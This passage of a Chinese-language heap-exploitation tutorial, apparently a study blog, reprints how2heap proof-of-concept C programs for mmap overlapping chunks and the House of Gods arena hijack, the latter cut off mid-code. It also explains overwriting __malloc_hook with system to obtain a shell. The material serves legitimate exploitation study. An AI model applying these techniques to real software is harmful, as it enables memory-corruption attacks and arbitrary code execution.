                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013210254989.png"
                      alt="image-20231013210254989"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013210849688.png"
                      alt="image-20231013210849688"
                ></p>
<p><code>glibc_2.23</code> 版本在 <code>__malloc_hook-0x23</code> 处存在 <code>0x7f</code> 大小的 <code>fake_fast</code> ，我们将 <code>fake_libc_chunk</code> 的 <code>fd</code> 指针指向 <code>fake_fast_malloc_hook</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013211147427.png"
                      alt="image-20231013211147427"
                ></p>
<p>申请 <code>3</code> 次 <code>0x70</code> 大小的 <code>chunk</code>，可以将 <code>fake_fast_malloc_hook</code> 申请出来。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013211909572.png"
                      alt="image-20231013211909572"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013211951560.png"
                      alt="image-20231013211951560"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212024266.png"
                      alt="image-20231013212024266"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212227267.png"
                      alt="image-20231013212227267"
                ></p>
<p>因为 <code>__malloc_hook</code> 和 <code>system</code> 的地址差异较大，需要更改的字节较多，所以我们通过 <code>unsorted_bin attack(前文有介绍，不再赘述)</code> 将其改为 <code>main_arena + 0x58</code> 处的地址，再将其改为 <code>system</code> 地址即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212506159.png"
                      alt="image-20231013212506159"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212722616.png"
                      alt="image-20231013212722616"
                ></p>
<p>从 <code>19(0x13，也就是 0x23-0x8_fd-0x8_bk)</code> 处开始按字节写入后 <code>system</code> 几位地址 ，再去 <code>&quot;malloc(&quot;/bin/sh\x00&quot;)&quot;</code> 即可 <code>getshell</code> 。</p>
<h2 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h2><h3 id="源码-17"><a href="#源码-17" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Technique should work on all versions of GLibC</span></span><br><span class="line"><span class="comment">Compile: `gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC written by POC written by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	A primer on Mmap chunks in GLibC</span></span><br><span class="line"><span class="comment">	==================================</span></span><br><span class="line"><span class="comment">	In GLibC, there is a point where an allocation is so large that malloc</span></span><br><span class="line"><span class="comment">	decides that we need a seperate section of memory for it, instead </span></span><br><span class="line"><span class="comment">	of allocating it on the normal heap. This is determined by the mmap_threshold var.</span></span><br><span class="line"><span class="comment">	Instead of the normal logic for getting a chunk, the system call *Mmap* is </span></span><br><span class="line"><span class="comment">	used. This allocates a section of virtual memory and gives it back to the user. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Similarly, the freeing process is going to be different. Instead </span></span><br><span class="line"><span class="comment">	of a free chunk being given back to a bin or to the rest of the heap,</span></span><br><span class="line"><span class="comment">	another syscall is used: *Munmap*. This takes in a pointer of a previously </span></span><br><span class="line"><span class="comment">	allocated Mmap chunk and releases it back to the kernel. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Mmap chunks have special bit set on the size metadata: the second bit. If this </span></span><br><span class="line"><span class="comment">	bit is set, then the chunk was allocated as an Mmap chunk. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Mmap chunks have a prev_size and a size. The *size* represents the current </span></span><br><span class="line"><span class="comment">	size of the chunk. The *prev_size* of a chunk represents the left over space</span></span><br><span class="line"><span class="comment">	from the size of the Mmap chunk (not the chunks directly belows size). </span></span><br><span class="line"><span class="comment">	However, the fd and bk pointers are not used, as Mmap chunks do not go back </span></span><br><span class="line"><span class="comment">	into bins, as most heap chunks in GLibC Malloc do. Upon freeing, the size of </span></span><br><span class="line"><span class="comment">	the chunk must be page-aligned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The POC below is essentially an overlapping chunk attack but on mmap chunks. </span></span><br><span class="line"><span class="comment">	This is very similar to https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c. </span></span><br><span class="line"><span class="comment">	The main difference is that mmapped chunks have special properties and are </span></span><br><span class="line"><span class="comment">	handled in different ways, creating different attack scenarios than normal </span></span><br><span class="line"><span class="comment">	overlapping chunk attacks. There are other things that can be done, </span></span><br><span class="line"><span class="comment">	such as munmapping system libraries, the heap itself and other things.</span></span><br><span class="line"><span class="comment">	This is meant to be a simple proof of concept to demonstrate the general </span></span><br><span class="line"><span class="comment">	way to perform an attack on an mmap chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	For more information on mmap chunks in GLibC, read this post: </span></span><br><span class="line"><span class="comment">	http://tukan.farm/2016/07/27/munmap-madness/</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>); </span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Extremely large chunks are special because they are allocated in their own mmaped section\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;of memory, instead of being put onto the normal heap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;=======================================================\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating three extremely large heap chunks of size 0x100000 \n\n&quot;</span>);</span><br><span class="line">		</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The first mmap chunk goes directly above LibC: %p\n&quot;</span>,top_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// After this, all chunks are allocated downwards in memory towards the heap.</span></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The second mmap chunk goes below LibC: %p\n&quot;</span>, mmap_chunk_2);</span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The third mmap chunk goes below the second mmap chunk: %p\n&quot;</span>, mmap_chunk_3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nCurrent System Memory Layout \n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;================================================\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;running program\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;heap\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;....\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;third mmap chunk\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;second mmap chunk\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;LibC\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;....\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;ld\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;first mmap chunk\n&quot;</span></span><br><span class="line">			<span class="string">&quot;===============================================\n\n&quot;</span> \</span><br><span class="line">			);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Prev Size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Size of third mmap chunk: 0x%llx\n\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Change the size of the third mmap chunk to overlap with the second mmap chunk\n&quot;</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This will cause both chunks to be Munmapped and given back to the system\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span></span><br><span class="line">	<span class="comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span></span><br><span class="line">	mmap_chunk_3[<span class="number">-1</span>] = (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="number">-1</span>]) + (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="number">-1</span>]) | <span class="number">2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Free the third mmap chunk, which munmaps the second and third chunks\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	This next call to free is actually just going to call munmap on the pointer we are passing it.</span></span><br><span class="line"><span class="comment">	The source code for this can be found at https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L2845</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	With normal frees the data is still writable and readable (which creates a use after free on </span></span><br><span class="line"><span class="comment">	the chunk). However, when a chunk is munmapped, the memory is given back to the kernel. If this</span></span><br><span class="line"><span class="comment">	data is read or written to, the program crashes.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Because of this added restriction, the main goal is to get the memory back from the system</span></span><br><span class="line"><span class="comment">	to have two pointers assigned to the same location.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="comment">// Munmaps both the second and third pointers</span></span><br><span class="line">	<span class="built_in">free</span>(mmap_chunk_3); </span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Would crash, if on the following:</span></span><br><span class="line"><span class="comment">	mmap_chunk_2[0] = 0xdeadbeef;</span></span><br><span class="line"><span class="comment">	This is because the memory would not be allocated to the current program.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Allocate a very large chunk with malloc. This needs to be larger than </span></span><br><span class="line"><span class="comment">	the previously freed chunk because the mmapthreshold has increased to 0x202000.</span></span><br><span class="line"><span class="comment">	If the allocation is not larger than the size of the largest freed mmap </span></span><br><span class="line"><span class="comment">	chunk then the allocation will happen in the normal section of heap memory.</span></span><br><span class="line"><span class="comment">	*/</span>	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Get a very large chunk from malloc to get mmapped chunk\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This should overlap over the previously munmapped/freed chunks\n&quot;</span>);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr: %p\n&quot;</span>, overlapping_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr Size: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Gets the distance between the two pointers.</span></span><br><span class="line">	<span class="type">int</span> distance = mmap_chunk_2 - overlapping_chunk;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n&quot;</span>, distance);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Value of index 0 of mmap chunk 2 prior to write: %llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Set the value of the overlapped chunk.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Setting the value of the overlapped chunk\n&quot;</span>);</span><br><span class="line">	overlapping_chunk[distance] = <span class="number">0x1122334455667788</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Show that the pointer has been written to.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Second chunk value (after write): 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk value: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Boom! The new chunk has been overlapped with a previous mmaped chunk\n&quot;</span>);</span><br><span class="line">	<span class="built_in">assert</span>(mmap_chunk_2[<span class="number">0</span>] == overlapping_chunk[distance]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-17"><a href="#调试-17" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014110953593.png"
                      alt="image-20231014110953593"
                ></p>
<p>首先申请三个 <code>0x100000</code> 大小的 <code>mmap_chunk</code>，分别为 <code>top_ptr</code>，<code>mmap_chunk_2</code>，<code>mmap_chunk_3</code>，第一个 <code>top_ptr</code> 位于 <code>libc.so</code> 上方。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111020031.png"
                      alt="image-20231014111020031"
                ></p>
<p>接下来将 <code>mmap_chunk_3</code> 的 <code>size</code> 改为 <code>202002</code>，因为 <code>mmap_chunk_3</code> 位于 <code>mmap_chunk_2</code> 低地址处，所以 <code>mmap_chunk_3</code> 现在的 <code>size</code> 大小包含了 <code>mmap_chunk_2</code> ，与 <code>2</code> 取与运算是为了将 <code>IS_MMAP</code> 位置为 <code>1</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111503915.png"
                      alt="image-20231014111503915"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111605033.png"
                      alt="image-20231014111605033"
                ></p>
<p>接下来 <code>free(mmap_chunk_3)</code> 。再次申请 <code>0x300000</code> 大小的 <code>overlapping_chunk</code>，<code>mmap_chunk_2</code> 被包含在了 <code>overlapping_chunk</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111828047.png"
                      alt="image-20231014111828047"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111851907.png"
                      alt="image-20231014111851907"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111909499.png"
                      alt="image-20231014111909499"
                ></p>
<p>我们可以通过 <code>overlapping_chunk</code> 去修改 <code>mmap_chunk_2</code> 的内容。</p>
<h2 id="house-of-gods"><a href="#house-of-gods" class="headerlink" title="house_of_gods"></a>house_of_gods</h2><p><code>glibc &lt; 2.27</code>，这是一个比较有趣的利用手法。</p>
<h3 id="源码-18"><a href="#源码-18" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* House of Gods PoC */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Welcome to the House of Gods...</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * House of Gods is an arena hijacking technique for glibc &lt; 2.27. It supplies</span></span><br><span class="line"><span class="comment"> * the attacker with an arbitrary write against the thread_arena symbol of</span></span><br><span class="line"><span class="comment"> * the main thread. This can be used to replace the main_arena with a</span></span><br><span class="line"><span class="comment"> * carefully crafted fake arena. The exploit was tested against</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     - glibc-2.23</span></span><br><span class="line"><span class="comment"> *     - glibc-2.24</span></span><br><span class="line"><span class="comment"> *     - glibc-2.25</span></span><br><span class="line"><span class="comment"> *     - glibc-2.26</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Following requirements are mandatory</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     - 8 allocs of arbitrary size to hijack the arena (+2 for ACE)</span></span><br><span class="line"><span class="comment"> *     - control over first 5 quadwords of a chunk&#x27;s userdata</span></span><br><span class="line"><span class="comment"> *     - a single write-after-free bug on an unsorted chunk</span></span><br><span class="line"><span class="comment"> *     - heap address leak + libc address leak</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This PoC demonstrates how to leverage the House of Gods in order to hijack</span></span><br><span class="line"><span class="comment"> * the thread_arena. But it wont explain how to escalate further to</span></span><br><span class="line"><span class="comment"> * arbitrary code execution, since this step is trivial once the whole arena</span></span><br><span class="line"><span class="comment"> * is under control.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Also note, that the how2heap PoC might use more allocations than</span></span><br><span class="line"><span class="comment"> * previously stated. This is intentional and has educational purposes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If you want to read the full technical description of this technique, going</span></span><br><span class="line"><span class="comment"> * from zero to arbitrary code execution within only 10 to 11 allocations, here</span></span><br><span class="line"><span class="comment"> * is the original document I&#x27;ve written</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     https://github.com/Milo-D/house-of-gods/blob/master/rev2/HOUSE_OF_GODS.TXT</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * I recommend reading this document while experimenting with</span></span><br><span class="line"><span class="comment"> * the how2heap PoC.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Besides that, this technique abuses a minor bug in glibc, which I have</span></span><br><span class="line"><span class="comment"> * already submitted to bugzilla at</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     https://sourceware.org/bugzilla/show_bug.cgi?id=29709</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * AUTHOR: David Milosevic (milo)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &lt;--- Exploit PoC ---&gt; */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=================\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;= House of Gods =\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=== Abstract ===\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The core of this technique is to allocate a fakechunk overlapping\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the binmap field within the main_arena. This fakechunk is located at\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;offset 0x850. Its sizefield can be crafted by carefully binning chunks\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;into smallbins or largebins. The binmap-chunk is then being linked into\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the unsorted bin via a write-after-free bug in order to allocate it back\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;as an exact fit. One can now tamper with the main_arena.next pointer at\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;offset 0x868 and inject the address of a fake arena. A final unsorted bin\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;attack corrupts the narenas variable with a very large value. From there, only\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;two more allocation requests for at least 0xffffffffffffffc0 bytes of memory\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;are needed to trigger two consecutive calls to the reused_arena() function,\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;which in turn traverses the corrupted arena-list and sets thread_arena to the\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;address stored in main_arena.next - the address of the fake arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=== PoC ===\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Okay, so let us start by allocating some chunks...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * allocate a smallchunk, for example a 0x90-chunk.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *SMALLCHUNK = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * allocate the first fastchunk. We will use</span></span><br><span class="line"><span class="comment">     * a 0x20-chunk for this purpose.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *FAST20 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * allocate a second fastchunk. This time</span></span><br><span class="line"><span class="comment">     * a 0x40-chunk.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *FAST40 = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p is our 0x90-sized smallchunk. We will bin this chunk to forge a\n&quot;</span>, SMALLCHUNK);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake sizefield for our binmap-chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p is our first fastchunk. Its size is 0x20.\n\n&quot;</span>, FAST20);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p is our second fastchunk with a size of 0x40. The usecase of\n&quot;</span>, FAST40);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;both fastchunks will be explained later in this PoC.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We can move our smallchunk to the unsorted bin by simply free&#x27;ing it...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * put SMALLCHUNK into the unsorted bin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">free</span>(SMALLCHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * this is a great opportunity to simulate a</span></span><br><span class="line"><span class="comment">     * libc leak. We just read the address of the</span></span><br><span class="line"><span class="comment">     * unsorted bin and save it for later.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">uint64_t</span> leak = *((<span class="type">uint64_t</span>*) SMALLCHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;And now we need to make a request for a chunk which can not be serviced by\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;our recently free&#x27;d smallchunk. Thus, we will make a request for a\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0xa0-sized chunk - let us call this chunk INTM (intermediate).\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * following allocation will trigger a binning</span></span><br><span class="line"><span class="comment">     * process within the unsorted bin and move</span></span><br><span class="line"><span class="comment">     * SMALLCHUNK to the 0x90-smallbin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *INTM = <span class="built_in">malloc</span>(<span class="number">0x98</span>);</span><br><span 